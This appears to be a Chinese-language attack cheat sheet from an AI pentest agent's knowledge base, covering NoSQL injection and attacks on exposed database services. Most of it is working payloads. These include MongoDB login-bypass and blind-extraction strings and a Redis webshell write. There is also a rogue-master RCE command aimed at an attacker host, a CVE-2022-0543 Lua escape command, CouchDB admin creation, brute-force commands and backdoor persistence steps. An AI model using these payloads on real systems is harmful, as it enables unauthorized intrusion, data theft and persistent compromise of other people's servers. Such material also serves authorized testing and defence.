# NoSQL 注入 — MongoDB 操作符注入

> NoSQL 注入与 SQL 注入本质不同: 注入**查询操作符对象**改变查询逻辑而非突破字符串。
> 加载时机: MongoDB 风格操作符、JSON 查询对象、灵活搜索过滤器、后端查询 DSL。

## §1 核心概念与操作符

```json
// 正常: find({username:"alice",password:"secret"})
// 注入: {"username":"admin","password":{"$gt":""}}  → password > "" 恒真
```

| 操作符 | 注入用途 |
|---|---|
| `$ne` | 认证绕过（≠空 恒真） |
| `$gt`/`$gte`/`$lt`/`$lte` | 比较（`$gt:""` 匹配全部非空） |
| `$eq`/`$in`/`$nin` | 精确/列表 |
| `$regex` | 盲注逐字符提取 |
| `$exists` | 绕空值检查 |
| `$where` | **最高危**——服务端 JS 执行 |
| `$not`/`$or`/`$and`/`$nor` | 逻辑组合 |
| `$elemMatch`/`$size`/`$type` | 数组/类型探测 |

**SQLi vs NoSQLi**: 信号=引号报错 vs `{$ne:x}` 改变响应；提取=UNION vs `$regex` oracle；绕过=`' OR 1=1--` vs `{"password":{"$ne":""}}`；指纹=DB 错误 vs "cannot use $"/BSON 类错误。

**检测 payload**: `true, $where: '1 == 1'` / `', $where: '1 == 1` / `{ $ne: 1 }` / `[$ne]=invalid`；表单端点改 `Content-Type: application/json` 发 JSON 操作符。

**错误指纹**: `MongoError: bad query`（确认 MongoDB）/ `CastError` / `BSONTypeError` / `unknown operator` / `Cannot apply $regex modifier`（部分过滤）/ `"$where is not allowed"`（部分托管环境禁用，版本敏感自验）。

## §2 认证绕过 payload 集

**JSON body**:
```json
{"username": "admin", "password": {"$ne": "invalid"}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$not": {"$eq": "wrong"}}}
{"username": "admin", "password": {"$type": 1}}   // 类型不匹配，利用逻辑视应用而定
```

**PHP $_POST 数组**（方括号解析为数组）: `username=admin&password[$ne]=invalid` / `password[$regex]=.*` / `password[$not][$eq]=xxx` / `username[$in][0]=admin&username[$in][1]=root`
**Ruby/Python/Node（qs 库）**: `?username[%24ne]=invalid`（%24 = `$`）
**重复键绕过**: `{"id": "10", "id": "100"}` —— 解析器取最后键；WAF 验第一个、应用处理第二个。

## §3 盲注提取

**$regex 布尔盲注**: `{"username":"admin","password":{"$regex":"^a"}}` → 登录成功 = 首字符 a；逐位收窄 `^a`→`^ab`。oracle = 登录成功/失败差异。
GET 型: `username=admin&password[$regex]=^a.*`
自动化: 逐字符 + 非字母数字加 `\` 转义。

**$where 时间盲注**:
```json
{"$where": "if(this.username=='admin' && this.password[0]=='a'){sleep(5000);return true;}return false;"}
```
输入直达 $where 字符串: `' || 1==1 || '` / `; return true; var x='` / `; if(this.password[0]=='a'){sleep(5000)}; var x='`

限制: $where 仅当前文档字段（this.xxx），是服务端 JS 注入非 OS 命令执行；老版本 V8 沙箱不严有 RCE 顾虑，$where sink 一律高危。

**$regex 上下文 breakout（id 补）**: 输入拼进 /.../i 正则时 `a^/)||(条件)&&(/a^` 逃出正则上下文注入布尔条件，结果计数当 oracle（this.product.charCodeAt(i)>m 二分提取）。
**Redis Lua 注入**: 用户参数拼 Lua 脚本体（非 KEYS/ARGV）时 `123') and redis.call('get','admin') --` ——Lua 内 redis.call 是官方桥，HTTP 层 Redis 命令黑名单全失效。

## §4 聚合管道注入

用户输入进 `$match`/`$group` 阶段时传对象:
```javascript
db.collection.aggregate([{$match: {category: userInput}}])
// userInput = {"$ne": null} → 全匹配
```
- **$lookup 注入**（跨集合）: `{$lookup: {from: "admin_users", localField: "user_id", foreignField: "_id", as: "leaked"}}` → admin 数据联进结果
- **$out 注入**（写出）: `{$out: "public_collection"}` → 结果写入可达集合，绕读取限制

信息收集: `db.getName()` / `db.getCollectionNames()` / `db.adminCommand('listDatabases')` / `db.users.findOne()` / `db.version()`。

## §5 CouchDB / Redis / HPP

**CouchDB（5984 暴露）**:
```bash
curl http://target:5984/_all_dbs
curl http://target:5984/DB_NAME/_all_docs?include_docs=true
curl -X PUT http://target:5984/_config/admins/attacker -d '"password"'   # 匿名可写时建管理员
```
**Redis（6379 无认证）写 webshell**:
```
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```
弱口令: `AUTH password` / `123456` / `redis` / `admin`。
**Redis 主从复制 RCE**（4.x/5.x，CONFIG SET 写受限时）: 恶意主机作 master → 目标作 slave 加载恶意 module .so → 命令执行。工具: `redis-rogue-server.py --rhost target --lhost your-ip` / `RedisWriteFile.py`。⚠ 主从 RCE 打多次会导致目标 Redis 瘫痪——非必要不重复打。
 写公钥/写 cron 变体与 gopher/dict 协议 payload 见 `$AGENT_DIR/knowledge-base/ssrf-advanced.md` §4（gopher 构造）。加固三件套（报告修复建议）: `requirepass <强密码>` + `bind 127.0.0.1` + `protected-mode yes`。
**Redis Lua 沙箱逃逸 CVE 线**: CVE-2022-0543（Debian/Ubuntu 打包特有<6.2.x）`EVAL 'local io_l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local f=io_l().popen("id","r"); return f:read("*a")' 0`; CVE-2025-49844 UAF/46817 unpack 溢出/46818 元表污染（<8.2.2/8.0.4/7.4.6/7.2.11/6.2.20）。模块手动加载: `MODULE LOAD /tmp/x.so`→`system.exec "id"`（清理 MODULE UNLOAD+SLAVEOF NO ONE）。后利用: `MONITOR` 捕获其他客户端凭据/`SLOWLOG GET 25`/`KEYS *password*|*token*`（大库用 `SCAN 0 MATCH ... COUNT 100` 防阻塞）/BGSAVE 优先（SAVE 阻塞主线程）/RDB 用 rdbtools 解析/`PSUBSCRIBE "*"` 窃听/crontab 路径发行版差异（Ubuntu=/var/spool/cron/crontabs/ CentOS=/var/spool/cron/）/`CONFIG SET requirepass` 后门维持。

**Elasticsearch（9200 未授权）**:
```bash
curl http://target:9200/_cat/indices?v      # 索引
curl http://target:9200/_cat/nodes          # 节点
curl "http://target:9200/index/_search?q=*" # 搜数据
```
CVE-2014-3120（动态脚本未禁）: `POST /_search {"script_fields":{"test":{"script":"...Runtime...exec(\"id\")"}}}`。

**MongoDB GridFS**: `db.fs.files.find()` 列文件；`mongofiles -d dbname get filename` 下载。

**数据库服务默认端口/弱口令总表**:
| 服务 | 端口 | 弱口令 |
|---|---|---|
| MySQL | 3306 | root:root/123456 |
| MSSQL | 1433 | sa:sa/123456 |
| PostgreSQL | 5432 | postgres:postgres |
| Oracle | 1521 | system:system、scott:tiger |
| Redis | 6379 | 123456/redis/admin |
| MongoDB | 27017 | 默认无认证 |
| Elasticsearch | 9200 | 默认无认证 |
| Memcached | 11211 | 默认无认证 |
| CouchDB | 5984 | 默认 admin party |
爆破: `hydra -L users.txt -P passwords.txt target mysql|mssql|postgres`；批量探测 `nmap -p 3306,1433,5432,1521,6379,27017,9200 target`。

**HPP 配合**: `?filter[$ne]=invalid` → Node qs 解析为 `filter={$ne:"invalid"}` → 操作符注入。

## §6 测试 checklist

```
□ 登录字段: {"$ne"} JSON body
□ 表单: password[$ne]=invalid
□ $regex 盲注枚举字段值
□ $where sleep() 时间盲注
□ 5984 CouchDB / 6379 Redis 未授权
□ 表单端点改 Content-Type: application/json
□ 监控 BSON/operator/$not allowed 错误
```

## §7 关联文件

- `$AGENT_DIR/knowledge-base/sqli-advanced.md` — SQL 注入（对比参照）
- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — §1.2 速查指针
